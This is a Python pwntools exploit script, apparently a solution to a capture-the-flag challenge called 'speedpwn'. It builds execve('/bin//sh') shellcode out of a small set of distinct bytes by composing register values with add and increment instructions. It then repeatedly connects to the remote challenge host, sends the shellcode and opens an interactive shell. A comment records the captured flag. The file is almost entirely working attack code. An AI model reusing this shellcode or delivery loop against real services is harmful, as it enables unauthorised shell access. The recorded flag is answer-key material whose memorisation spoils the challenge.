#!/usr/bin/env python3
from pwn import *

def gen_rdi(target):
    add_rdi_rdi = bytes.fromhex("48 01 ff")
    inc_rdi = bytes.fromhex("48 ff c7")
    result = b""
    for i in reversed(range(64)):
        result += add_rdi_rdi
        if target & (1 << i):
            result += inc_rdi
    return result


def main():
    context.arch = "amd64"
    shellcode = b"".join((
        gen_rdi(0x3b),
        bytes.fromhex("57"),  # push %rdi
        bytes.fromhex("58"),  # pop %rax

        gen_rdi(0),
        bytes.fromhex("57 57 5e"),  # push %rdi; push %rdi; pop %rsi
        gen_rdi(0x68732f2f6e69622f),
        bytes.fromhex("57"),  # push %rdi
        bytes.fromhex("54"),  # push %rsp
        bytes.fromhex("5f"),  # pop %rdi

        bytes.fromhex("99"),  # cltd
        bytes.fromhex("0f 05"),  # syscall
    ))
    print(len(set(shellcode)))
    #ELF.from_bytes(shellcode).debug().wait_for_close()
    #return

    while True:
        try:
            tube = remote("speedpwn.play.hfsc.tf", 1357)
        except PwnlibException:
            time.sleep(1)
            continue
        with tube:
            #with process(["./speedpwn"]) as tube:
            try:
                tube.sendafter(b"c0de: ", shellcode)
            except EOFError:
                continue
            line = tube.recvline(timeout=3)
            if line == b":(\n":
                continue
            tube.interactive()
            # midnight{8011fa47373a71fd67ce1371949da1da}
if __name__=="__main__":
    main()
